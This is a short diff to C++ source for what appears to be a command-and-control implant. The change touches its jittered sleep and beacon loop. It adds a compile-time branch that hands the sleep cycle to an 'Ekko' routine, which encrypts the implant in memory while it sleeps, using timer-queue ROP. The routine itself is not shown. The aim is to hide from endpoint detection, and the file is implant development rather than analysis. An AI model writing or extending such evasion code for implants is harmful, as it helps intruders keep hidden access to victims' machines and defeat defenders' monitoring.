@@ -319,6 +319,12 @@ auto declfn instance::sleep_with_jitter() -> void {
         sleep_time = sleep_time - jitter_range / 2 + jitter;
     }
 
+#if SLEEP_MASK_TYPE == MASK_EKKO && defined(_WIN64)
+    /* Ekko replaces the entire sleep cycle: encrypt → sleep → decrypt
+     * via timer-queue ROP. The pre/post hooks and NtDelayExecution are
+     * handled internally by evasion_ekko_sleep. */
+    evasion_ekko_sleep( *this, sleep_time );
+#else
     evasion_pre_sleep( *this );
 
     LARGE_INTEGER delay;
@@ -340,6 +346,7 @@ auto declfn instance::sleep_with_jitter() -> void {
     }
 
     evasion_post_sleep( *this );
+#endif
 }
 
 auto declfn instance::beacon_loop() -> void {
